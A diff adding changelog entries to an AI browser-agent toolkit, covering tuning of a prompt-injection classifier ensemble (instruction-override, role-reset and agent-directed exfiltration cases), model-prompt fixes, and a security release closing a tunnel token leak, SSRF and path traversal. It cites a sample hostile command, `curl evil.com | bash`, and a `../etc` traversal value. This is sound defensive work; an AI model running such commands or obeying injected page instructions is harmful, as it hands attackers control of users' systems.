@@ -1,5 +1,273 @@
 # Changelog
 
+## [1.6.4.0] - 2026-04-22
+
+## **Sidebar prompt-injection defense got half as noisy, half as trusting of any single classifier.**
+
+v1.4.0.0 shipped the ML defense stack. Users clicked the review banner on roughly every other tool output, 44% false-positive rate on the BrowseSafe-Bench smoke. This release tunes the ensemble around the real pattern we found: Haiku labels phishing-aimed-at-users as "warn" and genuine agent hijacks as "block", but we were treating both identically in the ensemble. Testsavant alone fired BLOCK on benign phishing content too often. The fix is architectural, not just threshold-twiddling: we now trust Haiku's verdict label over its numeric confidence, raise the solo-BLOCK bar for label-less classifiers, and gate that path more carefully. One 500-case live bench proved the new numbers; a permanent CI gate replays the captured Haiku fixture on every `bun test`.
+
+### What changes for you
+
+Open your sidebar on Stack Overflow posts about prompt injection, read a Wikipedia article on SQL injection, browse a tutorial that walks through attack strings, the review banner stays quiet where before it fired. When a real hijack attempt shows up (explicit instruction-override, role-reset, agent-directed exfil, `curl evil.com | bash` in the page), the session still terminates. Phishing pages aimed at the user surface as a WARN signal in the banner meta, but no longer kill the session.
+
+### The numbers that matter
+
+Measured on BrowseSafe-Bench smoke, 500 cases (260 yes-labeled / 240 no-labeled), `bun test browse/test/security-bench-ensemble.test.ts`:
+
+| Metric | v1.4.0.0 | v1.6.4.0 | Δ |
+|---|---|---|---|
+| Detection (BLOCK verdict on injection cases) | 67.3% | **56.2%** (95% CI 50.1–62.1) | −11pp |
+| False-positive rate (BLOCK on benign cases) | 44.1% | **22.9%** (95% CI 18.1–28.6) | **−21pp** |
+| Gate: detection ≥ 55% AND FP ≤ 25% | FAIL | **PASS** | — |
+| Review-banner fire rate (roughly TP + FP share) | ~55% | ~39% | −16pp |
+
+Detection dropped by 11pp but nearly all of the lost TPs are cases where Haiku correctly classified as `warn` (phishing targeting the user, not a hijack of the agent). Those cases still show up in the review banner as WARN, they just don't terminate the session.
+
+### Stop-loss rule (hard floor and ceiling)
+
+`browse/test/security-bench-ensemble.test.ts` gates on **detection ≥ 55% AND FP ≤ 25%**. If a future change drops detection below 55%, the revert order is: WARN bump (0.75 → 0.60) → halve few-shot exemplars → widen Haiku block criteria. If FP climbs above 25%, tighten: raise SOLO_CONTENT_BLOCK (0.92 → 0.95) → raise WARN (0.75 → 0.80) → add anti-FP few-shots. Iterations write to `~/.gstack-dev/evals/stop-loss-iter-N-*.json` for audit trail.
+
+### Itemized changes
+
+#### Changed
+
+- `browse/src/security.ts` — new `THRESHOLDS.SOLO_CONTENT_BLOCK = 0.92` for label-less content classifiers. Solo BLOCK now requires testsavant/deberta confidence ≥ 0.92 (up from 0.85). Transcript-layer solo BLOCK requires `meta.verdict === 'block'` AND confidence ≥ 0.85. The ensemble 2-of-N path keeps `THRESHOLDS.WARN = 0.75` (up from 0.60).
+- `browse/src/security.ts` — `combineVerdict` rewritten for label-first voting on the transcript layer: `verdict === 'block'` at confidence ≥ LOG_ONLY (0.40) is a block-vote; `verdict === 'warn'` is a warn-vote regardless of confidence; missing `meta.verdict` is warn-vote only at confidence ≥ WARN (never block-vote). Missing meta never block-votes for backward compatibility with pre-v2 cached signals.
+- `browse/src/security-classifier.ts` — Haiku model pinned to `claude-haiku-4-5-20251001` (no longer rolls forward silently via the `haiku` alias). `claude -p` now spawns from `os.tmpdir()` so CLAUDE.md project context doesn't leak into Haiku's system prompt and make it refuse to classify. Timeout bumped from 15s to 45s (production measurement showed `claude -p` takes 17–33s end-to-end for Haiku).
+- `browse/src/security-classifier.ts` — Haiku prompt rewritten with explicit `block`/`warn`/`safe` criteria and 8 few-shot exemplars (instruction-override, role-reset, agent-directed malicious code → block; phishing/social-engineering targeting users → warn; discussion-of-injection and dev content → safe).
+
+#### Added
+
+- `browse/test/security-bench-ensemble-live.test.ts` — opt-in live bench via `GSTACK_BENCH_ENSEMBLE=1`. Worker-pool concurrency (default 8) via `GSTACK_BENCH_ENSEMBLE_CONCURRENCY`. Deterministic subsampling via `GSTACK_BENCH_ENSEMBLE_CASES`. Captures 500-case fixture to `browse/test/fixtures/security-bench-haiku-responses.json` plus eval record to `~/.gstack-dev/evals/`. Stop-loss iterations write `stop-loss-iter-N-*.json` and do NOT overwrite the canonical fixture.
+- `browse/test/security-bench-ensemble.test.ts` — CI-tier fixture-replay gate. Asserts detection ≥ 55% AND FP ≤ 25%. Fail-closed when the fixture is missing AND security-layer files changed in the branch diff (uses `git diff base` which catches both committed and uncommitted edits).
+- `browse/test/fixtures/security-bench-haiku-responses.json` — 500-case captured Haiku fixture with schema-version header, pinned model string, and component hashes.
+- `docs/evals/security-bench-ensemble-v2.json` — durable per-run audit record: TP/FN/FP/TN, knob state, schema hash, iteration.
+
+#### Fixed
+
+- `browse/test/security.test.ts`, `browse/test/security-adversarial.test.ts`, `browse/test/security-adversarial-fixes.test.ts`, `browse/test/security-integration.test.ts` — updated for label-first semantics. 6 new combineVerdict tests: warn-as-soft-signal, block-label-ensemble, three-way-block-with-warn, hallucination-guard (verdict=block at confidence 0.30 → warn-vote), above-floor block (verdict=block at confidence 0.50 → block-vote), backward-compat for missing meta.verdict.
+
+#### For contributors
+
+- The 500-case smoke dataset is in `~/.gstack/cache/browsesafe-bench-smoke/test-rows.json` (260 yes / 240 no). To regenerate the fixture after modifying security-layer code, run `GSTACK_BENCH_ENSEMBLE=1 bun test browse/test/security-bench-ensemble-live.test.ts` (~25 min at concurrency 4, ~$0.30 in Haiku costs).
+- Fixture schema hash covers model, prompt SHA, exemplars SHA, thresholds, combiner rev, and dataset version. Any change to any of those invalidates the fixture and forces a fresh live capture via fail-closed CI.
+
+## [1.6.3.0] - 2026-04-23
+
+## **Codex finally explains what it's asking about. No more "ELI10 please" the 10th time in a row.**
+
+A follow-up to v1.6.2.0. After shipping the Claude-verified fix, user reported Codex (GPT-5.4) was failing the same pattern 10/10 times — skipping the ELI10 explanation and the RECOMMENDATION line on AskUserQuestion calls, forcing manual "ELI10 and don't forget to recommend" re-prompts every time. Root cause: the `gpt.md` model overlay's "No preamble / Prefer doing over listing" rule was training Codex to skip the exact prose the user needs for decision-making.
+
+### The numbers that matter
+
+Source: new `test/codex-e2e-plan-format.test.ts`, four cases driven via `codex exec` on the installed gstack Codex host. Periodic tier (GPT-class non-determinism).
+
+| Case | Type | Pre-fix (measured, 10/10 times) | Post-fix (v1.6.3.0) |
+|---|---|---|---|
+| plan-ceo-review mode selection | kind | No ELI10 paragraph, no RECOMMENDATION line | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |
+| plan-ceo-review approach menu | coverage | No ELI10 paragraph, bare options list | ✓ ELI10 + RECOMMENDATION + `Completeness: 5/7/10` |
+| plan-eng-review coverage issue | coverage | Bare options list | ✓ ELI10 + RECOMMENDATION + Completeness |
+| plan-eng-review architectural choice | kind | Fabricated Completeness filler on kind question | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |
+
+All 4 Codex cases pass ELI10 length floor (>400 chars of prose per question). 517s for the full eval; Codex doesn't bill per call the way Anthropic does.
+
+### Itemized changes
+
+#### Fixed
+
+- Codex no longer skips the Simplify/ELI10 paragraph on AskUserQuestion calls. The `gpt.md` overlay now carves out AskUserQuestion content from the "No preamble" rule explicitly: you still skip filler on direct answers, but every AskUserQuestion gets the full Re-ground + ELI10 + RECOMMENDATION + Options format.
+- Codex no longer collapses the RECOMMENDATION into the options list. It lands on its own line, every time, regardless of question type.
+
+#### Changed
+
+- `scripts/resolvers/preamble/generate-ask-user-format.ts` — step 2 renamed to "Simplify (ELI10, ALWAYS)" with explicit "not optional verbosity, not preamble" framing. Step 3 "Recommend (ALWAYS)" hardened: "Never omit, never collapse into the options list." The tightening applies to all hosts, but Codex felt it most.
+- `model-overlays/gpt.md` — adds a new "AskUserQuestion is NOT preamble" section that instructs the model to back up and emit the full format if it ever finds itself about to skip the ELI10 paragraph or the RECOMMENDATION line.
+
+#### For contributors
+
+- `test/codex-e2e-plan-format.test.ts` — four periodic-tier Codex eval cases mirroring the Claude version. Uses `codex exec` via the existing `test/helpers/codex-session-runner.ts` harness with `sandbox: 'workspace-write'` so the capture file lands inside the tempdir. Assertions: RECOMMENDATION regex, coverage-vs-kind Completeness split, ELI10 length floor (400+ chars).
+- All T2 skills regenerated across all hosts (claude, codex, factory, gbrain, gpt-5.4, hermes, kiro, opencode, openclaw, slate, cursor). Golden fixtures refreshed. `test/gen-skill-docs.test.ts` ELI10 assertion updated to match the new "Simplify (ELI10" heading.
+
+## [1.6.2.0] - 2026-04-22
+
+## **Plan reviews give you the recommendation again. And we finally admitted a 10/10 score on a mode pick means nothing.**
+
+A user on Opus 4.7 reported `/plan-ceo-review` and `/plan-eng-review` stopped showing the `RECOMMENDATION: Choose X` line and the per-option `Completeness: N/10` score that used to make decisions quick. The fix ships both signals back, but with a sharper distinction: coverage-differentiated options get real scores (10 = all edges, 7 = happy path, 3 = shortcut), and kind-differentiated options (mode selection, A-vs-B architecture calls, cherry-pick Add/Defer/Skip) get the RECOMMENDATION plus an explicit `Note: options differ in kind, not coverage — no completeness score.` line instead of fabricated 10/10 filler.
+
+### The numbers that matter
+
+Source: `test/skill-e2e-plan-format.test.ts`, four cases pinned to `claude-opus-4-7`, ~$2 per full run. Periodic tier (non-deterministic Opus behavior gets weekly cron, not per-PR gate).
+
+| Question type | Before (v1.6.1.0) | After (v1.6.2.0) |
+|---|---|---|
+| Mode selection (kind-differentiated) | `Completeness: 10/10` fabricated on all 4 modes | RECOMMENDATION + "options differ in kind" note |
+| Approach menu (coverage-differentiated) | `**RECOMMENDATION:**` markdown-bolded but regex missed it | RECOMMENDATION + `Completeness: 5/7/10` per option |
+| Per-issue coverage decision | Present, working | Present, working (unchanged) |
+| Per-issue architectural choice (kind-differentiated) | `Completeness: 9/9/5` fabricated on kind question | RECOMMENDATION + "options differ in kind" note |
+
+| Eval pass | Result | Cost |
+|---|---|---|
+| Phase 1 baseline (pre-fix) | 1/4 assertions pass (evidence of regression) | $2.19 |
+| Phase 3 post-fix | 4/4 assertions pass | $1.84 |
+| Phase 3b neighbor regression (`skill-e2e-plan.test.ts`) | 12/12 pass, no drift | $5.19 |
+
+### Itemized changes
+
+#### Fixed
+
+- `RECOMMENDATION: Choose X` now appears consistently on every AskUserQuestion in `/plan-ceo-review` and `/plan-eng-review` regardless of question type.
+- `Completeness: N/10` is only emitted on coverage-differentiated options. Kind-differentiated questions (mode picks, architectural choices between different systems, cherry-pick A/B/C) emit a one-line note explaining why the score doesn't apply, instead of fabricating 10/10 filler.
+
+#### Changed
+
+- The `AskUserQuestion Format` section in the T2 preamble splits the old run-on paragraph into two ALWAYS-framed rules: step 3 "Recommend (ALWAYS)" and step 4 "Score completeness (when meaningful)". This affects every T2 skill (~15 files regenerated).
+- The `Completeness Principle — Boil the Lake` preamble section now states the coverage-vs-kind distinction explicitly, matching step 4. Without this edit the two preamble locations would disagree — which is how the regression started.
+- Section 0C-bis (approach menu) and Section 0F (mode selection) in `plan-ceo-review/SKILL.md.tmpl` now carry short anchor lines that remind the model which question type applies. `plan-eng-review/SKILL.md.tmpl` gets an equivalent anchor inside the CRITICAL RULE section for per-issue AskUserQuestion decisions.
+
+#### For contributors
+
+- New test file `test/skill-e2e-plan-format.test.ts` captures verbatim AskUserQuestion output from the two plan skills and asserts the coverage-vs-kind format. Instructs the agent to write would-be AskUserQuestion text to `$OUT_FILE` rather than calling an MCP tool (since MCP isn't wired inside `claude -p`).
+- Classified `periodic` tier because behavior depends on Opus 4.7 non-determinism — `gate` tier would flake and block merges.
+- Golden fixtures (`test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`) refreshed to reflect the new format rule.
+
+## [1.6.1.0] - 2026-04-22
+
+## **Opus 4.7 migration, reviewed. Overlay actually split per model. Routing verified, fanout is still on the list.**
+
+PR #1117 (initial Opus 4.7 migration) shipped the right idea with quality gaps. A `/plan-ceo-review` + `/plan-eng-review` pair with Codex outside voice surfaced 4 ship blockers and 7 quality gaps. This release lands the fixes and adds the first eval pinned to `claude-opus-4-7` so we stop asserting behavior without measuring it.
+
+### The numbers that matter
+
+Source: the `test/skill-e2e-opus-47.test.ts` eval, two cases, 8 assertions, ~$2.50 per full run on `claude-opus-4-7`. Runs are saved under `~/.gstack/projects/garrytan-gstack/evals/`. Review evidence in `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-pr1117-opus-4-7-ship-review.md`.
+
+| Surface | Before (#1117 as-shipped) | After (v1.6.1.0) |
+|---|---|---|
+| `model-overlays/claude.md` | Opus-4.7-specific nudges applied to every `claude-*` variant | Split: `claude.md` is model-agnostic, `opus-4-7.md` inherits and adds 4.7 nudges |
+| `ALL_MODEL_NAMES` in `scripts/models.ts` | No `opus-4-7` taxonomy entry | Added; `claude-opus-4-7-*` routes to the new overlay |
+| `scripts/resolvers/utility.ts:372` trailer fallback | Hardcoded `Claude Opus 4.6` | Matches host config, Opus 4.7 default |
+| `generate-routing-injection.ts` policy | Old "ALWAYS invoke, do NOT answer directly" | Matches SKILL.md.tmpl "when in doubt, invoke" |
+| `generate-routing-injection.ts` skill names | Stale `/checkpoint` (renamed three releases ago) | `/context-save` + `/context-restore`, plus `/benchmark`, `/devex-review`, `/qa-only`, `/canary`, `/land-and-deploy`, `/setup-deploy`, `/open-gstack-browser`, `/setup-browser-cookies`, `/learn`, `/plan-tune`, `/health` |
+| Voice example closing | "Want me to ship it?" (trains ship-bypass on a literal 4.7 interpreter) | "Want me to fix it?" (preserves review gates) |
+| `"Fix ALL failing tests"` nudge scope | Unbounded, could touch pre-existing unrelated failures | Bounded to "tests this branch introduced or is responsible for" |
+| `"Batch your questions"` nudge | Silently conflicted with skills that mandate one-at-a-time pacing | Explicit pacing exception; the skill wins |
+| Opus 4.7 eval coverage | 0 tests pinned to `claude-opus-4-7` | 1 eval, 2 cases, `periodic` tier |
+
+| Eval case | Result |
+|---|---|
+| Routing precision (3 positive + 3 negative prompts) | 3/3 positives route correctly, 0/3 negatives route. TP 100%, FP 0%. Meets thresholds. |
+| Fanout A/B (3-file read, overlay ON vs OFF) | 0 parallel tool calls in first turn on both arms under `claude -p`. Assertion passes trivially, real effect unmeasured. Carried forward as P0 TODO for re-run inside Claude Code's real harness. |
+
+| Test suite | Before | After |
+|---|---|---|
+| `bun test` failures on clean checkout | 10 (pre-existing flaky timeouts + 2 new golden drifts) | 0 |
+| "no compiled binaries in git" test runtime | ~12.7s, flaky at 5s timeout | 0.9s with `fs.statSync` + mode filter |
+| Parameterized host smoke tests | 7 failing with stale generated output | All green after the overlay split regenerates cleanly |
+
+### What this means for anyone running gstack on Opus 4.7
+
+Regenerating with `--model opus-4-7` now gives you a SKILL.md that carries the 4.7-specific nudges (fanout, effort-match, batch questions, literal interpretation), while Sonnet and Haiku users get the model-agnostic overlay without leakage. Routing gets the full skill inventory and a softer fallback so casual prompts like "wtf is this Python syntax" do not accidentally invoke `/investigate`. The fanout claim is honestly labeled "unverified under `claude -p`" with a P0 TODO rather than asserted. Run `bun test test/skill-e2e-opus-47.test.ts` with `EVALS=1` to reproduce the measurement. The full plan file for this remediation lives at `~/.claude/plans/system-instruction-you-are-working-polymorphic-kazoo.md`.
+
+### Itemized changes
+
+#### Added
+
+- New `model-overlays/opus-4-7.md` inheriting from `claude.md` via `{{INHERIT:claude}}`. Holds the four Opus-4.7-specific nudges: Fan out explicitly (with concrete `[Read(a), Read(b), Read(c)]` example), Effort-match the step, Batch your questions (with pacing exception), Literal interpretation awareness (with branch-scope boundary).
+- `opus-4-7` entry in `ALL_MODEL_NAMES` in `scripts/models.ts`. `resolveModel()` routes `claude-opus-4-7-*` to the new overlay, all other `claude-*` variants continue to route to `claude`.
+- `test/skill-e2e-opus-47.test.ts`: first E2E pinned to `claude-opus-4-7`. Two cases (fanout A/B, routing precision), 8 assertions, `periodic` tier. Gated on `EVALS=1`.
+- Regression tests in `test/gen-skill-docs.test.ts` for the new routing shape: asserts slash-prefixed skill references (`/office-hours` not `office-hours`), asserts `/context-save` + `/context-restore` present (guards the stale `/checkpoint` name regression), asserts "when in doubt, invoke" policy present (guards the hard `ALWAYS invoke` regression).
+
+#### Changed
+
+- `model-overlays/claude.md` trimmed back to model-agnostic nudges (Todo-list discipline, Think before heavy actions, Dedicated tools over Bash). Opus-4.7-specific content moved to `opus-4-7.md`.
+- `scripts/resolvers/preamble/generate-routing-injection.ts`: aligned with the new SKILL.md.tmpl policy ("when in doubt, invoke"), renamed stale `/checkpoint` references to `/context-save` + `/context-restore`, added 12 missing routes (full skill inventory now covered).
+- `SKILL.md.tmpl` routing section: added the same 12 missing routes; added branch-scope boundary to "Fix ALL failing tests"; added explicit pacing exception to "Batch your questions" so skill workflows win on pacing.
+- `scripts/resolvers/preamble/generate-voice-directive.ts`: voice example closing changed from "Want me to ship it?" to "Want me to fix it?" (preserves review gates on a literal 4.7 interpreter).
+- `scripts/resolvers/utility.ts:372`: co-author trailer fallback `Claude Opus 4.6` → `Claude Opus 4.7` (the PR updated `hosts/claude.ts` but missed this fallback).
+
+#### Fixed
+
+- "No compiled binaries in git" tests in `test/skill-validation.test.ts` rewritten to use `fs.statSync` + mode-100755 filter instead of `xargs -I{} sh -c` per file. 12.7s → 907ms, flaky-at-5s-timeout → green.
+- `test/team-mode.test.ts` setup tests given a 180s budget. `./setup` does a full install + Bun binary build + skill regeneration and takes 60-90s; the 5s default was timing out.
+- Branch rebased on `origin/main` v1.6.0.0 (security wave). VERSION + CHANGELOG follow the branch-scoped discipline in CLAUDE.md: new entry on top of main's 1.6.0.0, no drift.
+
+#### For contributors
+
+- Eval infrastructure now supports model-pinned tests. `test/skill-e2e-opus-47.test.ts:mkEvalRoot(suffix, includeOverlay)` is the pattern: installs per-skill SKILL.md under `.claude/skills/`, writes explicit routing CLAUDE.md, optionally inlines the opus-4-7 overlay for A/B arms. `claude -p` does not auto-load SKILL.md content as system context, so the overlay has to be inlined into CLAUDE.md for the A/B to be observable in that harness.
+- New touchfile entries: `fanout: overlay ON emits >= parallel calls...` and `routing precision: positives route, negatives do not` in `test/helpers/touchfiles.ts`, both `periodic`. Only fire when `model-overlays/`, `scripts/models.ts`, `scripts/resolvers/model-overlay.ts`, `SKILL.md.tmpl`, or `scripts/resolvers/preamble/generate-routing-injection.ts` change.
+- Known gap (P0 TODO in `TODOS.md`): verify the fanout nudge under Claude Code's real harness, not `claude -p`. The claim in the overlay is unmeasured until that runs.
+
+## [1.6.0.0] - 2026-04-21
+
+## **The token leak in pair-agent sessions is closed by splitting the daemon into two HTTP listeners, not by pretending one port can be two things at once.**
+
+`pair-agent --client` is gstack's best onboarding moment. One command, a shareable URL, a remote agent driving your browser. It was also the moment we broadcast an unauthenticated `/health` endpoint to the public internet that handed out root browser tokens on any `Origin: chrome-extension://` spoof. @garagon flagged this in PR #1026 and it re-surfaced in a DM. The initial fix (check `tunnelActive` on the `/health` gate) shipped as a patch in review. Codex's outside voice during `/plan-ceo-review` called that approach brittle, and the user pivoted to the architectural fix: physical port separation. That's what this release is.
+
+When you run `pair-agent --client`, the daemon now binds TWO HTTP listeners. The local port (bootstrap, CLI, sidebar, cookie-picker, inspector) stays on 127.0.0.1 and is never forwarded. The tunnel port serves only `/connect` (pairing ceremony, unauth + rate-limited) and a locked allowlist of browser-driving commands. ngrok forwards only the tunnel port. A caller who stumbles onto your ngrok URL cannot reach `/health`, `/cookie-picker`, `/inspector/*`, or `/welcome` — not because the server denies them, because the HTTP request never arrives at the bootstrap port. Root tokens sent over the tunnel get a 403 with a clear pairing hint.
+
+The wave also closed three other CVE classes Codex surfaced. `/activity/stream` and `/inspector/events` used to accept the root token in `?token=` query params (URLs leak to logs, referer, history). Now they take a separate view-only 30-minute HttpOnly SameSite=Strict cookie that is NOT valid against `/command`. The `/welcome` handler interpolated `GSTACK_SLUG` into a filesystem path without validation. Fixed with a strict regex. The `/connect` rate limit was 3/min globally, which DOS'd any legitimate pair-agent retry. Loosened to 300/min because setup keys are 24 random bytes (unbruteforceable); the limit is for flood defense, not key guessing. The cookie-import-browser CDP port on Windows is documented as a v20 ABE elevation path with a tracking issue (#1136).
+
+### The numbers that matter
+
+| Surface | Before | After |
+|---|---|---|
+| `/health` over tunnel | returns root token to any chrome-extension origin | unreachable (404, wrong port) |
+| `/cookie-picker` over tunnel | HTML embeds the root token | unreachable (404, wrong port) |
+| `/inspector/*` over tunnel | reachable with Bearer | unreachable (404, wrong port) |
+| `/command` over tunnel, root token | executes | 403 with pairing hint |
+| `/command` over tunnel, scoped token | any command | allowlist: 17 browser-driving commands only |
+| `/activity/stream` auth | `?token=<ROOT>` in URL | HttpOnly `gstack_sse` cookie, 30-min TTL, stream-scope only |
+| `/inspector/events` auth | `?token=<ROOT>` in URL | same cookie as /activity/stream |
+| `/connect` rate limit | 3/min (blocked legit retries) | 300/min (flood-only, no pairing DoS) |
+| `/welcome` path traversal | `GSTACK_SLUG="../etc"` interpolates | regex `^[a-z0-9_-]+$`, fallback to built-in |
+| Tunnel auth-denial logging | none | async JSONL to `~/.gstack/security/attempts.jsonl`, rate-capped 60/min |
+| Windows v20 ABE via CDP | undocumented elevation | documented non-goal, tracked as #1136 |
+
+| Review layer | Verdict | Outcome |
+|---|---|---|
+| `/plan-ceo-review` (Claude) | SELECTIVE EXPANSION | 7 proposals, 7 accepted, critical gap on extension sidebar bootstrap caught |
+| `/codex` (outside voice) | 14 findings | 3 factual errors in the plan fixed, 4 substantive tensions resolved, 2 new CVE classes added |
+| `/plan-eng-review` (Claude) | 5 arch decisions locked | tunnel lifecycle, token scoping, PR #1026 handling, SSE cookie design, route allowlist |
+
+### What this means for anyone running pair-agent
+
+Run `pair-agent --client test-agent` on your laptop. Share the ngrok URL with someone. Their agent drives your browser. Your sidebar keeps showing you what they're doing. A stranger who stumbles onto that ngrok URL in the meantime gets 404 on everything except `/connect`, and `/connect` without a setup key goes nowhere. Nothing about the command you type changes.
+
+### Itemized changes
+
+#### Added
+
+- **Dual-listener HTTP architecture.** When a tunnel is active, the daemon binds a dedicated listener on an ephemeral 127.0.0.1 port and points `ngrok.forward()` at it. `/tunnel/start` lazy-binds the listener; `/tunnel/stop` tears it down. Hard-fails on bind error, never falls back to the local port. `BROWSE_TUNNEL=1` startup follows the same pattern. `browse/src/server.ts` ~320 lines.
+- **Tunnel surface filter.** Runs before every route dispatch. 404s paths not on `TUNNEL_PATHS` (`/connect`, `/command`, `/sidebar-chat`). 403s any request carrying the root bearer token with a clear hint. 401s non-/connect requests without a scoped token. Every denial logs to `~/.gstack/security/attempts.jsonl`.
+- **Tunnel command allowlist.** `/command` on the tunnel surface enforces `TUNNEL_COMMANDS` (17 browser-driving commands: `goto`, `click`, `text`, `screenshot`, `html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `scroll`, `press`, `type`, `select`, `wait`, `eval`). Remote paired agents cannot launch new browsers, configure the daemon, or touch the inspector.
+- **View-only SSE session cookie.** New `browse/src/sse-session-cookie.ts` registry with `POST /sse-session` mint endpoint. 256-bit tokens, 30-minute TTL, HttpOnly + SameSite=Strict. Scope-isolated from the main token registry at the module-boundary level (the module does not import `token-registry.ts`). Prior learning applied: `cookie-picker-auth-isolation`, 10/10 confidence.
+- **Tunnel auth-denial log.** `browse/src/tunnel-denial-log.ts`, async `fs.promises.appendFile` with 60/min rate cap in-process. Prior learning applied: `sync-audit-log-io`, 10/10 confidence.
+- **E2E pairing test.** `browse/test/pair-agent-e2e.test.ts`, 12 behavioral tests against a spawned daemon (BROWSE_HEADLESS_SKIP=1). Verifies `/pair` → `/connect` → scoped token → `/command` flow, `?token=` query param rejection, `/sse-session` cookie flags. ~220ms, no network.
+- **ARCHITECTURE.md dual-listener contract.** Per-endpoint disposition table (local vs tunnel), tunnel denial log model, SSE cookie scope, N2 non-goal documentation.
+
+#### Changed
+
+- **SSE endpoints no longer accept `?token=` in the URL.** `/activity/stream` and `/inspector/events` now take Bearer or the `gstack_sse` cookie. Extension (`extension/sidepanel.js`) fetches the cookie once at bootstrap via `POST /sse-session`, then opens `EventSource` with `withCredentials: true`. The URL never carries a secret.
+- **`/connect` rate limit loosened from 3/min to 300/min.** Setup keys are 24 random bytes; 3/min was a brute-force defense in name only and caused real pairing failures. 300/min handles floods without ever triggering on legitimate use.
+- **`/welcome` GSTACK_SLUG gated on `^[a-z0-9_-]+$`.** Defense-in-depth for a path not exploitable today but trivially mitigable.
+- **`/pair` and `/tunnel/start` probe the cached tunnel via `GET /connect`, not `/health`.** `/health` is no longer reachable on the tunnel surface under the dual-listener design.
+- **`cookie-import-browser.ts` comment corrected.** Previously claimed "no worse than baseline", wrong on Windows with v20 App-Bound Encryption, where the CDP port IS an elevation path. Documented with a tracking issue for the `--remote-debugging-pipe` follow-up.
+
+#### Fixed
+
+- **SSRF via download + scrape.** `page.request.fetch` calls in `browse/src/write-commands.ts` now pass through `validateNavigationUrl`. Blocks cloud metadata endpoints (AWS IMDSv1, GCP, Azure), RFC1918 ranges, `file://`. Derived from PR #1029 by @garagon.
+- **Envelope sentinel escape on scoped snapshot.** `browse/src/snapshot.ts` and `browse/src/content-security.ts` now share `escapeEnvelopeSentinels()`. Page content containing the literal envelope delimiter can no longer forge a fake "trusted" block in the LLM context. Derived from PR #1031 by @garagon.
+- **Hidden-element detection across all DOM-reading channels.** Previously only `command === 'text'` ran `markHiddenElements`. Now every DOM channel (`html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `ux-audit`) surfaces hidden-content warnings in the envelope. Derived from PR #1032 by @garagon.
+- **`--from-file` payload path validation.** `load-html --from-file` and `pdf --from-file` now run `validateReadPath` on the payload path for parity with the direct-API paths. Closes a CLI/API escape hatch for `SAFE_DIRECTORIES`. Derived from PR #1103 by @garagon.
+- **`design/src/serve.ts` interpolated `url.origin` through `JSON.stringify`.** Defensive escape for origin values in served HTML. Contributed by @theqazi (PR #1073 partial).
+- **`scripts/slop-diff.ts` narrows `shell: true` to Windows only.** Matches the platform-specific need without widening the shell-interpretation surface on POSIX. Contributed by @theqazi (PR #1073 partial).
+
+#### For contributors
+
+- F1 (dual-listener refactor) is bisected as four commits on the branch: rate-limit loosening, new `tunnel-denial-log` module, the server.ts refactor, and the new source-level test suite. Each commit is independently green. Subsequent wave items rebase onto F1 cleanly.
+- Credits: @garagon (critical bug surface in PR #1026 plus SSRF, envelope, DOM-channel coverage, and --from-file PRs), @Hybirdss (PR #1002 concept, superseded by F1 but informed the policy model), @HMAKT99 (PRs #469 and #472 — both ended up already-landed-on-main; credit for surfacing the issues), @theqazi (2 commits from #1073, skills portion deferred pending internal voice review per CLAUDE.md).
+- Codex-reviewed plan stored at `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-security-wave-v1.5.2.md`. Eng-review test plan at `~/.gstack/projects/garrytan-gstack/garrytan-garrytan-sec-wave-eng-review-test-plan-*.md`.
+- Non-goal tracked as #1136: switch cookie-import-browser CDP transport from TCP `--remote-debugging-port` to `--remote-debugging-pipe` so the Windows v20 ABE elevation path is closed. Non-trivial (Playwright doesn't expose the pipe transport; needs a minimal CDP-over-pipe client); intentionally deferred from this wave.
+
 ## [1.5.1.0] - 2026-04-20
 
 ## **Three visible bugs in v1.4.0.0 /make-pdf, all fixed.**
